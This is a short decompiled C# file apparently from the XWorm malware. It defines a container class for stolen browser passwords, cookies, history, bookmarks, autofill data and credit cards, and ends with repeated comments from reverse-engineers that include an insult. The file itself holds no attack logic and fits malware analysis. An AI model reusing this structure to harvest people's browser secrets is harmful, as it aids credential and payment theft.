using System.Collections.Generic;

namespace XWorm;

public class GClass11
{
	public List<GClass17> listps { get; set; }

	public List<GClass15> listcookie { get; set; }

	public List<GClass18> listhist { get; set; }

	public List<GClass14> listbmark { get; set; }

	public List<GClass13> listautofill { get; set; }

	public List<GClass16> listcredit { get; set; }

	public GClass11()
	{
		listps = new List<GClass17>();
		listcookie = new List<GClass15>();
		listhist = new List<GClass18>();
		listbmark = new List<GClass14>();
		listautofill = new List<GClass13>();
		listcredit = new List<GClass16>();
	}
}


//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower




//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower




//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower


